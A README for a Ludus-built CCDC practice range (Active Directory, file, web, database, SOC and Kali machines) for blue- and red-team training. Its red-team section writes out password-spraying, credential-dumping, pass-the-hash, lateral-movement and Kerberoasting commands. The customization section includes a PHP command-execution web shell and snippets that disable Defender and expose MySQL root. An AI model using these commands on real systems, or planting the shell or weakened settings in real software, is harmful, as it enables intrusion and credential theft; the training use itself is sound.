# Ludus CCDC Practice Environment - No External Roles Required

## Overview

This Ludus range configuration creates a comprehensive 10-VM CCDC (Collegiate Cyber Defense Competition) practice environment using **only built-in Ansible modules** - no external role dependencies required. Perfect for blue team defense training, red team attack practice, and incident response exercises.

## Why This Configuration?

### ✅ Advantages of No External Roles

- **Zero Dependencies** - Deploy immediately without hunting for roles on Ansible Galaxy
- **Complete Transparency** - See exactly what every command does
- **Easy Customization** - Modify any task for your specific training needs
- **Simple Troubleshooting** - When something fails, you know exactly what went wrong
- **Perfect for Learning** - Understand how systems are actually configured
- **Red Team Friendly** - Easy to add intentional vulnerabilities for training

### 🎯 What You Get

A realistic enterprise environment with:
- Active Directory domain (blue.lab) with 7 user accounts
- File server with SMB shares
- Domain-joined workstations
- Web server (Apache + PHP)
- Database server (MySQL)
- SOC/monitoring server (rsyslog, fail2ban)
- Router/gateway with NAT
- Kali Linux attacker (isolated VLAN)

## Environment Architecture

### Network Topology

```
┌─────────────────────────────────────────────────────────────┐
│                    VLAN 10 (Corporate)                       │
│                     10.10.10.0/24                            │
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐   │
│  │   DC01   │  │   FS01   │  │   WS01   │  │   WS02   │   │
│  │ .10.10   │  │ .10.20   │  │ .10.101  │  │ .10.102  │   │
│  │Win2019DC │  │Win2019FS │  │ Win10    │  │ Win10    │   │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘   │
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐   │
│  │  web01   │  │   db01   │  │  soc01   │  │ router01 │   │
│  │ .10.30   │  │ .10.40   │  │ .10.50   │  │  .10.1   │   │
│  │ Apache   │  │  MySQL   │  │ rsyslog  │  │   NAT    │   │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘   │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                  VLAN 99 (Attacker Network)                  │
│                     10.99.99.0/24                            │
│                                                              │
│                     ┌──────────┐                             │
│                     │  kali01  │                             │
│                     │ .99.10   │                             │
│                     │   Kali   │                             │
│                     └──────────┘                             │
└─────────────────────────────────────────────────────────────┘
```

### System Details

| Hostname | Role | OS | IP | vCPU | RAM | VLAN |
|----------|------|----|----|------|-----|------|
| DC01 | Domain Controller | Windows Server 2019 | 10.10.10.10 | 2 | 4GB | 10 |
| FS01 | File Server | Windows Server 2019 | 10.10.10.20 | 2 | 4GB | 10 |
| WS01 | Workstation | Windows 10 Enterprise | 10.10.10.101 | 2 | 4GB | 10 |
| WS02 | Workstation | Windows 10 Enterprise | 10.10.10.102 | 2 | 4GB | 10 |
| web01 | Web Server | Debian 12 | 10.10.10.30 | 2 | 2GB | 10 |
| db01 | Database Server | Debian 12 | 10.10.10.40 | 2 | 4GB | 10 |
| soc01 | SOC/Monitoring | Debian 12 | 10.10.10.50 | 2 | 4GB | 10 |
| router01 | Router/Gateway | Debian 12 | 10.10.10.1 | 1 | 2GB | 10 |
| kali01 | Attacker | Kali Linux | 10.99.99.10 | 2 | 4GB | 99 |

**Total Resources Required:**
- **vCPUs:** 17 cores
- **RAM:** 30GB
- **Storage:** ~300GB (depending on templates)

## Active Directory Configuration

### Domain Information

**Domain Name:** blue.lab  
**NetBIOS Name:** BLUE  
**Domain Controller:** DC01 (10.10.10.10)  
**DNS Server:** 10.10.10.10  
**Forwarders:** 8.8.8.8, 8.8.4.4

### User Accounts

**Domain Administrator:**
- Username: `DomainAdmin`
- Password: `P@ssw0rd123!`
- Groups: Domain Admins, Enterprise Admins

**Standard Users:**

| Username | Full Name | Password | Groups |
|----------|-----------|----------|--------|
| jsmith | John Smith | Summer2024! | Domain Users |
| mjones | Mary Jones | Winter2024! | Domain Users |
| bwilliams | Bob Williams | Spring2024! | Domain Users |
| tdavis | Tom Davis | Fall2024! | Domain Users |
| kbrown | Kim Brown | Autumn2024! | Domain Users |
| lmiller | Lisa Miller | Seasons2024! | Domain Users |

**Local Administrator (all Windows systems):**
- Username: `Administrator` or `localadmin`
- Password: Set during template creation
- Password for DSRM: `P@ssw0rd123!SafeMode`

## Services and Applications

### File Server (FS01)

**SMB Shares:**
- `\\FS01\CompanyData` - General company shared files
  - Full Control: Domain Admins
  - Change: Domain Users
  
- `\\FS01\IT` - IT department files
  - Full Control: Domain Admins
  - Change: Domain Users

- `\\FS01\HR` - Human Resources files
  - Full Control: Domain Admins
  - Change: Domain Users

**Access from workstation:**
```cmd
net use Z: \\FS01\CompanyData /user:blue\jsmith Summer2024!
```

### Web Server (web01)

**Services:**
- Apache 2.4 on port 80
- PHP enabled
- Default page displays environment info

**Access:**
- HTTP: `http://10.10.10.30`
- SSH: `ssh ludus@10.10.10.30`

**Configuration Files:**
- Apache config: `/etc/apache2/`
- Web root: `/var/www/html/`
- Logs: `/var/log/apache2/`

### Database Server (db01)

**Services:**
- MySQL 8.0 on port 3306
- Database: `ccdc_app` (created automatically)

**Credentials:**
- Root user: `root`
- Root password: `MySQLR00t!`

**Access:**
```bash
# From db01 locally
mysql -u root -p'MySQLR00t!'

# From remote system (if allowed)
mysql -h 10.10.10.40 -u root -p
```

**Configuration:**
- Config: `/etc/mysql/`
- Data: `/var/lib/mysql/`
- Logs: `/var/log/mysql/`

### SOC/Monitoring Server (soc01)

**Installed Tools:**
- rsyslog (centralized logging on port 514)
- fail2ban (intrusion prevention)
- tcpdump (packet capture)
- tshark/wireshark (packet analysis)
- nmap (network scanning)
- htop, iftop (monitoring)

**Log Collection:**
- Receives syslog from all systems on UDP/TCP 514
- Logs stored in: `/var/log/remote/<hostname>/`

**Configure clients to send logs:**
```bash
# On any Linux system
echo "*.* @10.10.10.50:514" >> /etc/rsyslog.conf
systemctl restart rsyslog

# On Windows (via Group Policy or PowerShell)
# Configure Windows Event Forwarding to forward to soc01
```

### Router/Gateway (router01)

**Configuration:**
- IP Forwarding: Enabled
- NAT: Configured for outbound traffic
- Acts as default gateway for VLAN 10

**Routing:**
- Internal interface: eth1 (10.10.10.1)
- External interface: eth0
- MASQUERADE enabled for NAT

### Kali Linux Attacker (kali01)

**Pre-installed Tools:**
- Metasploit Framework
- Nmap
- Burp Suite
- BloodHound
- CrackMapExec
- Impacket scripts
- Responder
- enum4linux
- smbclient
- gobuster
- nikto
- sqlmap
- John the Ripper
- hashcat

**Additional Tools in /opt/tools:**
- PowerSploit (PowerShell exploitation)
- BloodHound (AD mapping)

**Access:**
- SSH: `ssh ludus@10.99.99.10`
- Default Kali credentials (check your template)

## Deployment Instructions

### Prerequisites

1. **Ludus Installation:** Ludus must be installed and operational
2. **Network Configuration:** VLANs 10 and 99 configured
3. **Templates Available:**
   - `win2019-server-x64-template`
   - `win10-22h2-x64-enterprise-template`
   - `debian-12-x64-server-template`
   - `kali-x64-desktop-template`

4. **Resources:**
   - Minimum 17 CPU cores available
   - Minimum 30GB RAM available
   - Minimum 300GB storage available

### Step-by-Step Deployment

#### 1. Verify Ludus is Ready

```bash
ludus version
ludus templates list
```

#### 2. Upload Configuration

```bash
ludus range config set -f ludus-range-config-no-roles.yml
```

#### 3. Verify Configuration

```bash
# View your configuration
ludus range config get

# Validate syntax (if available)
ludus range config validate
```

#### 4. Deploy the Range

```bash
ludus range deploy
```

**Deployment Time:** Approximately 45-60 minutes depending on hardware

#### 5. Monitor Deployment Progress

```bash
# Check overall status
ludus range status

# Watch real-time logs
ludus range logs --follow

# Check individual VM status
ludus range list
```

#### 6. Verify Deployment

Once deployment completes, verify each component:

```bash
# List all VMs
ludus range list

# Check if VMs are accessible
ludus range test
```

## Post-Deployment Verification

### 1. Verify Domain Controller (DC01)

```powershell
# RDP to DC01
ludus range rdp DC01

# Or SSH if configured
ludus range ssh DC01

# Verify AD services
Get-Service ADWS,DNS,Netlogon | Select Name,Status
Get-ADDomain
Get-ADUser -Filter *

# Verify DNS
nslookup blue.lab
nslookup dc01.blue.lab
```

**Expected Results:**
- AD Domain Services running
- Domain: blue.lab
- 7 user accounts visible
- DNS resolving domain names

### 2. Verify File Server (FS01)

```powershell
# Connect to FS01
ludus range rdp FS01

# Verify domain membership
Get-ComputerInfo | Select CsDomain

# Verify shares
Get-SmbShare

# Test access from workstation
# On WS01 or WS02:
net use Z: \\FS01\CompanyData /user:blue\jsmith Summer2024!
dir Z:
```

**Expected Results:**
- FS01 is member of blue.lab domain
- 3 shares visible (CompanyData, IT, HR)
- Shares accessible from domain-joined machines

### 3. Verify Workstations (WS01, WS02)

```powershell
# Connect to WS01
ludus range rdp WS01

# Verify domain membership
Get-ComputerInfo | Select CsDomain

# Login as domain user
# Username: blue\jsmith
# Password: Summer2024!

# Test file share access
net use Z: \\FS01\CompanyData
```

**Expected Results:**
- Workstations joined to blue.lab
- Can login with domain credentials
- Can access file shares

### 4. Verify Web Server (web01)

```bash
# SSH to web01
ssh ludus@10.10.10.30

# Check Apache status
sudo systemctl status apache2

# Test web page
curl http://localhost
curl http://10.10.10.30
```

**From another system:**
```bash
curl http://10.10.10.30
# Or browse to http://10.10.10.30
```

**Expected Results:**
- Apache running and enabled
- Web page displays CCDC environment message
- PHP info visible

### 5. Verify Database Server (db01)

```bash
# SSH to db01
ssh ludus@10.10.10.40

# Check MySQL status
sudo systemctl status mysql

# Login to MySQL
mysql -u root -p'MySQLR00t!'

# Verify database
SHOW DATABASES;
USE ccdc_app;
```

**Expected Results:**
- MySQL running and enabled
- Root login works
- ccdc_app database exists

### 6. Verify SOC Server (soc01)

```bash
# SSH to soc01
ssh ludus@10.10.10.50

# Check rsyslog status
sudo systemctl status rsyslog

# Check if receiving logs
ls -la /var/log/remote/

# Check fail2ban
sudo systemctl status fail2ban
sudo fail2ban-client status
```

**Expected Results:**
- rsyslog running and listening on port 514
- Remote log directories being created
- fail2ban active

### 7. Verify Router (router01)

```bash
# SSH to router01
ssh ludus@10.10.10.1

# Check IP forwarding
cat /proc/sys/net/ipv4/ip_forward
# Should return: 1

# Check NAT rules
sudo iptables -t nat -L -n -v

# Check forwarding rules
sudo iptables -L FORWARD -n -v
```

**Expected Results:**
- IP forwarding enabled
- NAT rules configured
- Forwarding rules in place

### 8. Verify Kali Attacker (kali01)

```bash
# SSH to kali01
ssh ludus@10.99.99.10

# Verify tools installation
which metasploit
which nmap
which bloodhound

# Check cloned repositories
ls -la /opt/tools/

# Test network isolation
ping 10.10.10.10
# Should work if routing configured, or fail if isolated
```

**Expected Results:**
- Kali tools installed
- PowerSploit and BloodHound in /opt/tools
- On separate VLAN 99

## Network Testing

### Test Internal Connectivity (VLAN 10)

```bash
# From any VLAN 10 system
ping 10.10.10.10   # DC01
ping 10.10.10.20   # FS01
ping 10.10.10.30   # web01
ping 10.10.10.40   # db01
ping 10.10.10.50   # soc01

# Test DNS resolution
nslookup dc01.blue.lab
nslookup fs01.blue.lab
```

### Test VLAN Segmentation

```bash
# From kali01 (VLAN 99)
ping 10.10.10.10   # Should work if router allows, or timeout if isolated

# From DC01 (VLAN 10)
ping 10.99.99.10   # Test if corporate can reach attacker network
```

## Training Scenarios

### Blue Team Defense Exercises

#### 1. Baseline the Environment

- Document all running services
- Map network topology
- Identify critical assets
- Create network diagram
- Document user accounts and permissions

#### 2. Implement Monitoring

- Configure Windows Event Log forwarding to soc01
- Set up Sysmon on Windows systems
- Configure Linux systems to send logs to soc01
- Create detection rules in fail2ban
- Set up alerts for suspicious activity

#### 3. Hardening Tasks

**Active Directory:**
- Implement Group Policy Objects (GPOs)
- Configure password policies
- Enable audit logging
- Disable unnecessary services
- Apply security baselines

**File Server:**
- Review and restrict share permissions
- Enable access auditing
- Remove unnecessary shares
- Implement quotas

**Web Server:**
- Disable directory listing
- Remove default pages
- Configure SSL/TLS
- Implement ModSecurity WAF
- Harden PHP configuration

**Database:**
- Remove test databases
- Disable remote root login
- Create application-specific users
- Enable query logging
- Configure backups

**Workstations:**
- Deploy endpoint protection
- Configure Windows Firewall
- Disable unnecessary services
- Apply security updates
- Implement application whitelisting

#### 4. Incident Response Practice

- Investigate suspicious logins
- Analyze log files for indicators of compromise
- Practice containment procedures
- Document investigation findings
- Conduct post-incident reviews

### Red Team Attack Exercises

#### 1. Reconnaissance

**From kali01:**

```bash
# Network discovery
nmap -sn 10.10.10.0/24

# Port scanning
nmap -sS -sV -p- 10.10.10.10

# Service enumeration
nmap -sC -sV 10.10.10.10

# SMB enumeration
enum4linux -a 10.10.10.10
smbclient -L //10.10.10.20 -N

# Web enumeration
nikto -h http://10.10.10.30
gobuster dir -u http://10.10.10.30 -w /usr/share/wordlists/dirb/common.txt
```

#### 2. Initial Access

**Password Spraying:**
```bash
# Using CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Summer2024!'

# Using Metasploit
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.10.10.10
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

**Phishing Simulation:**
- Create malicious Office documents
- Set up fake authentication pages
- Practice social engineering techniques

#### 3. Post-Exploitation

**Credential Dumping:**
```bash
# Using Impacket
secretsdump.py blue/jsmith:Summer2024!@10.10.10.10

# Using Mimikatz (on compromised Windows system)
mimikatz # sekurlsa::logonpasswords
```

**Lateral Movement:**
```bash
# PSExec
psexec.py blue/jsmith:Summer2024!@10.10.10.20

# WMI
wmiexec.py blue/jsmith:Summer2024!@10.10.10.101

# Pass-the-Hash
crackmapexec smb 10.10.10.0/24 -u Administrator -H <NTLM_HASH>
```

**Domain Enumeration:**
```bash
# BloodHound data collection
bloodhound-python -d blue.lab -u jsmith -p Summer2024! -c all -dc dc01.blue.lab -ns 10.10.10.10

# PowerView (from compromised Windows system)
Import-Module /opt/tools/PowerSploit/Recon/PowerView.ps1
Get-NetUser
Get-NetGroup
Get-NetComputer
```

#### 4. Privilege Escalation

**Kerberoasting:**
```bash
# Request service tickets
GetUserSPNs.py blue.lab/jsmith:Summer2024! -dc-ip 10.10.10.10 -request

# Crack with hashcat
hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt
```

**Local Privilege Escalation:**
- Exploit unquoted service paths
- Token impersonation
- Exploit vulnerable services
- Abuse weak file permissions

#### 5. Persistence

**Techniques:**
- Create scheduled tasks
- Modify registry run keys
- Install backdoor services
- Create domain accounts
- Modify GPOs
- Plant web shells

#### 6. Data Exfiltration

**Practice:**
- Extract data from file shares
- Dump database contents
- Capture network traffic
- Exfiltrate via DNS/HTTP

### Purple Team Exercises (Combined Blue/Red)

1. **Attack & Detect Cycle:**
   - Red team performs attack
   - Blue team detects and responds
   - Review detection gaps
   - Improve defenses

2. **Threat Hunting:**
   - Blue team searches for threats
   - Red team validates findings
   - Document hunting procedures

3. **Tabletop Exercises:**
   - Discuss attack scenarios
   - Plan defense strategies
   - Test incident response procedures

## Customization Guide

### Adding Vulnerabilities for Training

Want to make the environment intentionally vulnerable? Here are some examples:

#### 1. Weak SMB Shares (in FS01 tasks)

```yaml
- name: Create intentionally insecure share
  win_share:
    name: "PublicDocs"
    path: "C:\\Shares\\Public"
    full: "Everyone"  # Insecure!
    state: present
```

#### 2. Disable Windows Defender (in workstation tasks)

```yaml
- name: Disable Windows Defender (TRAINING ONLY)
  win_shell: |
    Set-MpPreference -DisableRealtimeMonitoring $true
    Set-MpPreference -DisableIOAVProtection $true
```

#### 3. Enable Remote Desktop without NLA (in Windows tasks)

```yaml
- name: Enable RDP without Network Level Authentication
  win_regedit:
    path: HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
    name: UserAuthentication
    data: 0
    type: dword
```

#### 4. Create Web Vulnerability (in web01 tasks)

```yaml
- name: Create intentionally vulnerable PHP page
  copy:
    content: |
      <?php
      // INTENTIONALLY VULNERABLE FOR TRAINING
      $cmd = $_GET['cmd'];
      system($cmd);
      ?>
    dest: /var/www/html/admin.php
```

#### 5. Weak MySQL Configuration (in db01 tasks)

```yaml
- name: Allow remote root access (INSECURE)
  mysql_user:
    name: root
    password: "MySQLR00t!"
    host: "%"
    priv: "*.*:ALL,GRANT"
    state: present
```

### Adding Additional Services

#### Example: Add IIS to File Server

```yaml
# In FS01 tasks section, add:
- name: Install IIS
  win_feature:
    name:
      - Web-Server
      - Web-WebServer
      - Web-Common-Http
    include_management_tools: yes

- name: Start IIS
  win_service:
    name: W3SVC
    state: started
    start_mode: auto
```

#### Example: Add FTP Server to Linux

```yaml
# In web01 tasks section, add:
- name: Install vsftpd
  apt:
    name: vsftpd
    state: present

- name: Configure vsftpd
  copy:
    content: |
      listen=YES
      anonymous_enable=NO
      local_enable=YES
      write_enable=YES
    dest: /etc/vsftpd.conf

- name: Start vsftpd
  systemd:
    name: vsftpd
    state: started
    enabled: yes
```

### Modifying User Accounts

To add more users, edit the DC01 tasks:

```yaml
- name: Create Domain Users
  win_domain_user:
    name: "{{ item.name }}"
    firstname: "{{ item.firstname }}"
    surname: "{{ item.surname }}"
    password: "{{ item.password }}"
    state: present
    groups: "{{ item.groups | default(['Domain Users']) }}"
  loop:
    # Add your new users here
    - { name: "newuser", firstname: "New", surname: "User", password: "Password123!", groups: ["Domain Users"] }
```

### Changing IP Addressing

To modify IP addresses, update the `ip_last_octet` value and any hardcoded IPs:

```yaml
- vm_name: "{{ range_id }}-dc-01"
  ip_last_octet: 10  # Change this

# Also update any references to IPs in tasks:
- name: Set DNS server
  win_shell: |
    Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 10.10.10.10  # Update this
```

## Troubleshooting

### Common Issues and Solutions

#### 1. Domain Controller Won't Promote

**Symptoms:**
- DC promotion fails
- DNS errors
- "Domain controller promotion failed" messages

**Solutions:**
```powershell
# Check DNS configuration
Get-DnsClientServerAddress

# Verify network connectivity
Test-NetConnection -ComputerName 127.0.0.1

# Check AD DS installation
Get-WindowsFeature | Where-Object Name -eq "AD-Domain-Services"

# Review promotion logs
Get-Content C:\Windows\Debug\DCPROMO.LOG

# Manual promotion if needed
Install-ADDSForest -DomainName "blue.lab" -DomainNetbiosName "BLUE" -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssw0rd123!SafeMode" -AsPlainText -Force) -InstallDns -Force
```

#### 2. Systems Can't Join Domain

**Symptoms:**
- "Domain not found" errors
- "Network path not found"
- DNS resolution failures

**Solutions:**
```powershell
# Verify DNS settings
Get-DnsClientServerAddress

# Set DNS to DC
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 10.10.10.10

# Test domain connectivity
Test-ComputerSecureChannel -Server dc01.blue.lab

# Verify DC is reachable
Test-NetConnection -ComputerName 10.10.10.10 -Port 389

# Manual domain join if needed
Add-Computer -DomainName blue.lab -Credential (Get-Credential) -Restart
```

#### 3. File Shares Not Accessible

**Symptoms:**
- "Access denied" errors
- "Network path not found"
- Can't map drives

**Solutions:**
```powershell
# Verify shares exist
Get-SmbShare

# Check share permissions
Get-SmbShareAccess -Name CompanyData

# Test SMB connectivity
Test-NetConnection -ComputerName FS01 -Port 445

# Verify domain membership
Get-ComputerInfo | Select CsDomain

# Manual share access
net use Z: \\10.10.10.20\CompanyData /user:blue\jsmith Summer2024!
```

#### 4. Web Server Not Responding

**Symptoms:**
- Can't connect to http://10.10.10.30
- Connection timeout
- 502/503 errors

**Solutions:**
```bash
# Check Apache status
sudo systemctl status apache2

# View error logs
sudo tail -f /var/log/apache2/error.log

# Restart Apache
sudo systemctl restart apache2

# Check if port 80 is listening
sudo netstat -tlnp | grep :80

# Test locally
curl http://localhost

# Check firewall
sudo ufw status
sudo ufw allow 80/tcp
```

#### 5. Database Connection Issues

**Symptoms:**
- Can't connect to MySQL
- "Access denied" errors
- Connection timeout

**Solutions:**
```bash
# Check MySQL status
sudo systemctl status mysql

# View MySQL logs
sudo tail -f /var/log/mysql/error.log

# Restart MySQL
sudo systemctl restart mysql

# Test root login
mysql -u root -p'MySQLR00t!'

# Check MySQL listening
sudo netstat -tlnp | grep :3306

# Grant remote access if needed (INSECURE - training only)
mysql -u root -p'MySQLR00t!' -e "GRANT ALL ON *.* TO 'root'@'%' IDENTIFIED BY 'MySQLR00t!'; FLUSH PRIVILEGES;"
```

#### 6. Ansible Task Failures

**Symptoms:**
- Deployment fails midway
- Specific tasks timing out
- WinRM connection errors

**Solutions:**
```bash
# View detailed logs
ludus range logs --verbose

# Check specific VM status
ludus range list

# Re-run deployment (idempotent)
ludus range deploy

# Deploy specific hosts only
ludus range deploy --limit dc01

# Test WinRM connectivity
# From Ludus host:
ansible windows -m win_ping
```

#### 7. Network Connectivity Issues

**Symptoms:**
- VMs can't reach each other
- No internet access
- DNS not resolving

**Solutions:**
```bash
# Check VLAN configuration
# Verify VLANs 10 and 99 exist

# Test basic connectivity
ping 10.10.10.1   # Gateway
ping 10.10.10.10  # DC
ping 8.8.8.8      # Internet

# Check routing
ip route show
traceroute 8.8.8.8

# Verify DNS
nslookup blue.lab
nslookup dc01.blue.lab

# Check firewall rules
sudo iptables -L -n -v
```

### Getting Help

**Ludus Logs:**
```bash
ludus range logs
ludus range logs --follow
ludus range logs --vm dc01
```

**Ansible Verbose Mode:**
```bash
# More verbosity during deployment
ludus range deploy --verbose
```

**Check VM Console:**
```bash
# Access VM console for troubleshooting
ludus range console dc01
```

**Reset and Retry:**
```bash
# Destroy range and start fresh
ludus range destroy
ludus range deploy
```

## Security Considerations

### ⚠️ WARNING: Training Environment Only

This environment is designed for **training purposes only** and includes several security weaknesses by design:

1. **Weak Passwords** - Passwords are simple and documented
2. **Disabled Security Controls** - Some features intentionally weak
3. **No Network Segmentation** - Most systems on same VLAN
4. **Minimal Hardening** - Systems configured for learning, not security
5. **Administrative Access** - Multiple admin accounts with known passwords

### DO NOT Use This Configuration For:

- ❌ Production environments
- ❌ Internet-facing systems
- ❌ Real business operations
- ❌ Storing sensitive data
- ❌ Processing personal information

### DO Use This Configuration For:

- ✅ CCDC practice and preparation
- ✅ Blue team training
- ✅ Red team exercises
- ✅ Incident response practice
- ✅ Security tool testing
- ✅ Educational purposes

### Best Practices for Training Environments

1. **Isolate the Network** - Keep isolated from production
2. **Use Dedicated Hardware** - Don't mix with production systems
3. **Monitor Access** - Know who has access to the environment
4. **Regular Resets** - Destroy and redeploy regularly
5. **Document Changes** - Track modifications during training
6. **Secure Snapshots** - If taking snapshots, secure them

## Performance Optimization

### If Deployment is Slow

1. **Reduce Parallelism:**
   - Ludus deploys VMs in parallel by default
   - If overwhelmed, deploy in stages

2. **Increase Resources:**
   - Add more CPU cores to Ludus host
   - Add more RAM
   - Use SSD storage

3. **Optimize Templates:**
   - Pre-configure templates with updates
   - Reduce template sizes

### If Systems Are Sluggish

1. **Reduce VM Resources:**
   ```yaml
   # Lower RAM and CPU if needed
   ram_gb: 2  # Instead of 4
   cpus: 1    # Instead of 2
   ```

2. **Disable Unnecessary Services:**
   - Turn off Windows Update during competition
   - Disable indexing on Windows systems
   - Stop unused services

3. **Snapshot for Quick Recovery:**
   - Take snapshots after successful deployment
   - Restore from snapshot instead of redeploying

## Backup and Recovery

### Taking Snapshots

```bash
# Snapshot entire range
ludus range snapshot create baseline

# List snapshots
ludus range snapshot list

# Restore from snapshot
ludus range snapshot restore baseline
```

### Exporting Configuration

```bash
# Export your current configuration
ludus range config get > my-range-backup.yml

# Export with VMs included
ludus range export my-range-export.tar.gz
```

### Disaster Recovery

```bash
# If range is corrupted, destroy and redeploy
ludus range destroy
ludus range config set -f ludus-range-config-no-roles.yml
ludus range deploy
```

## Additional Resources

### Official Documentation

- **Ludus Documentation:** https://docs.ludus.cloud/
- **Ansible Documentation:** https://docs.ansible.com/
- **Windows Server Documentation:** https://docs.microsoft.com/windows-server/
- **Active Directory Documentation:** https://docs.microsoft.com/windows-server/identity/ad-ds/

### CCDC Resources

- **CCDC Homepage:** https://www.nationalccdc.org/
- **CCDC Practice Resources:** Various regional CCDC sites
- **Blue Team Training:** SANS, Cybrary, etc.

### Community

- **Ludus Discord/Slack:** Check Ludus website for community links
- **Reddit:** r/cybersecurity, r/netsec, r/homelab
- **GitHub:** Search for CCDC practice resources

## Changelog

### Version 1.0 (Initial Release)

- Complete 10-VM CCDC environment
- No external role dependencies
- Full Active Directory implementation
- File server with SMB shares
- Web and database servers
- SOC monitoring server
- Kali Linux attacker system
- Comprehensive documentation

## License and Credits

**Configuration:** MIT License - Use freely for educational purposes

**Created For:** CCDC practice and cybersecurity training

**Credits:**
- Ludus platform by Bad Sector Labs
- Ansible automation
- Community feedback and contributions

## Support

For issues with this configuration:

1. Check the **Troubleshooting** section above
2. Review Ludus logs: `ludus range logs`
3. Consult Ludus documentation
4. Reach out to Ludus community

For CCDC-specific questions:

1. Consult CCDC official resources
2. Connect with CCDC alumni and coaches
3. Practice with your team

---

**Happy Training! Good luck with your CCDC preparation! 🎯🛡️**
